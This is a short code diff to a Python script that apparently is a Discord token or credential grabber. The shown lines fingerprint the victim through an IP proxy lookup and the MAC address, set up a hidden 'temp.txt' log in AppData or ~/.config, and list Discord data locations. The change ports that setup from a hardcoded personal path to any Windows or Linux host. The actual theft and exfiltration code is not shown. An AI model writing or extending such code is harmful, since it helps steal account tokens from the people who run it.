@@ -60,21 +60,24 @@ vpn = requests.get('http://ip-api.com/json?fields=proxy')
 proxy = vpn.json()['proxy']
 mac = get_mac()
 
+roaming = os.getenv('AppData')
+## Output for txt file location
 import os
 
+# Try Windows APPDATA first
 roaming = os.getenv("APPDATA")
 
-# If running on Linux, APPDATA doesn't exist, so use ~/.config/ as fallback
+# If APPDATA doesn't exist (Linux, WSL, Kali) → use ~/.config/
 if roaming is None:
     roaming = os.path.expanduser("~/.config/")
 
-# Ensure the folder exists
+# Make sure the directory exists
 os.makedirs(roaming, exist_ok=True)
 
+# Open (or create) the temp.txt file safely
 output = open(os.path.join(roaming, "temp.txt"), "a")
 
-roaming = "/home/torisgoat67/.config/"
-output = open(roaming + "temp.txt", "a")
+
 
 ## Discord Locations
 Directories = {
